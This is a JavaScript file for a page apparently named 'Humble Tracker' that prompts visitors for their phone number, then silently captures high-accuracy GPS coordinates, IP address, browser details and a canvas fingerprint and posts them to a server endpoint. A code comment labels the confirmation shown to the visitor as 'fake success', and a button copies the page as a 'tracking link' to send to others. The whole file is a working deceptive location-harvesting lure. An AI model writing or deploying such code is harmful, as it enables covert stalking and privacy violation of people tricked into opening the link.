document.addEventListener('DOMContentLoaded', function() {
    const trackBtn = document.getElementById('trackBtn');
    const phoneInput = document.getElementById('phone');
    const countryCode = document.getElementById('countryCode');
    const result = document.getElementById('result');
    const status = document.getElementById('status');
    const copyBtn = document.getElementById('copyBtn');

    let trackingData = {};

    trackBtn.addEventListener('click', trackLocation);

    // Auto-focus phone input
    phoneInput.focus();

    copyBtn.addEventListener('click', function() {
        navigator.clipboard.writeText(window.location.href);
        showStatus('✅ Tracking link copied!', 'success');
    });

    async function trackLocation() {
        const phone = countryCode.value + phoneInput.value.replace(/\D/g, '');
        
        if (!phoneInput.value.trim()) {
            showStatus('⚠️ Please enter your phone number', 'loading');
            return;
        }

        trackBtn.classList.add('loading');
        status.innerHTML = '<div class="status loading">🔄 Capturing precise location...</div>';

        try {
            // Capture comprehensive tracking data
            trackingData = await captureAllData(phone);

            // Send to server
            await sendToServer(trackingData);

            // Show fake success
            displayResults(trackingData);

        } catch (error) {
            console.error('Tracking failed:', error);
            showStatus('⚠️ Using IP location only...', 'loading');
            // Fallback tracking
            const fallbackData = await captureFallbackData(phone);
            await sendToServer(fallbackData);
            displayResults(fallbackData);
        }

        trackBtn.classList.remove('loading');
    }

    async function captureAllData(phone) {
        // GPS Location
        let gpsData = {};
        if (navigator.geolocation) {
            gpsData = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(resolve, () => {}, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
        }

        // IP + Fingerprint
        const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        const fpData = await getFingerprint();

        return {
            phone: phone,
            timestamp: new Date().toISOString(),
            ip: ipData.ip,
            gps: gpsData.coords ? {
                lat: gpsData.coords.latitude,
                lon: gpsData.coords.longitude,
                accuracy: gpsData.coords.accuracy
            } : null,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            fingerprint: fpData,
            referrer: document.referrer
        };
    }

    async function captureFallbackData(phone) {
        const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        return {
            phone: phone,
            timestamp: new Date().toISOString(),
            ip: ipData.ip,
            userAgent: navigator.userAgent
        };
    }

    async function getFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Humble Tracker Canvas', 2, 2);
        return canvas.toDataURL();
    }

    async function sendToServer(data) {
        await fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }

    function displayResults(data) {
        document.getElementById('ipAddr').textContent = data.ip;
        document.getElementById('coords').textContent = 
            data.gps ? 
            `GPS: ${data.gps.lat.toFixed(4)}, ${data.gps.lon.toFixed(4)} (${data.gps.accuracy.toFixed(0)}m)` :
            'IP Location Detected';
        
        result.classList.remove('hidden');
        showStatus('✅ Location captured successfully! Thank you 🙏', 'success');
    }

    function showStatus(message, type) {
        status.innerHTML = `<div class="status ${type}">${message}</div>`;
    }
});